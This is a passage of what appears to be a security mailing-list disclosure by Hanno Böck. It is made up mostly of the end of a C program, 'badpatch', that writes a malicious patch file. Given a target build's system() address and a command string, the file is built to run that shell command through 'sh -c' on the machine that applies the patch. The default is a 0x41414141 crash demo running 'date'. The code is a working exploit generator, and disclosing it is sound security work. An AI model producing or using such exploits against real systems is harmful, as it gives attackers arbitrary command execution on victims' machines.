+    write(fd, bp->dblock.buf, bp->dblock.len);
+    write(fd, bp->eblock.buf, bp->eblock.len);
+}
+
+void
+badpatch_destroy(BadPatch *bp)
+{
+    if (bp) {
+        if (bp->cblock.buf) free(bp->cblock.buf);
+        if (bp->dblock.buf) free(bp->dblock.buf);
+        if (bp->eblock.buf) free(bp->eblock.buf);
+        free(bp);
+    }
+}
+
+int
+main(int argc, char *argv[])
+{
+    int fd;
+    const char *filename, *cmd;
+    uint32_t system_addr;
+    BadPatch *bp;
+
+    if (argc < 2) {
+        fprintf(stderr, "Usage: %s filename [system_addr] [cmd]\n",
+    argv[0]); fprintf(stderr, "\tfilename     output malicious patch
+    file here\n"); fprintf(stderr, "\tsystem_addr  system() address for
+    target build\n"); fprintf(stderr, "\t             [default:
+    0x41414141 crash demo]\n"); fprintf(stderr, "\tcmd          sh -c
+    command string\n"); fprintf(stderr, "\t             [default:
+    date(1)]\n"); return EXIT_FAILURE;
+    }
+
+    filename = argv[1];
+    system_addr = (argc > 2) ? strtoul(argv[2], NULL, 16) : 0x41414141;
+    cmd = (argc > 3) ? argv[3] : "date"; 
+     
+    if ((fd = open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0640)) ==
+    -1) { perror("open()");
+        return EXIT_FAILURE;
+    }
+    
+    if (!(bp = badpatch_create(system_addr, cmd))) {
+        fputs("patch creation failed\n", stderr);
+        close(fd);
+        return EXIT_FAILURE;
+    }
+    
+    badpatch_serialize(bp, fd);
+    badpatch_destroy(bp);
+    close(fd);
+
+    return 0;
+}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+-- 
+Hanno Böck
+https://hboeck.de/
+
+mail/jabber: hanno@...eck.de
+GPG: BBB51E42
+
+Content of type "application/pgp-signature" skipped
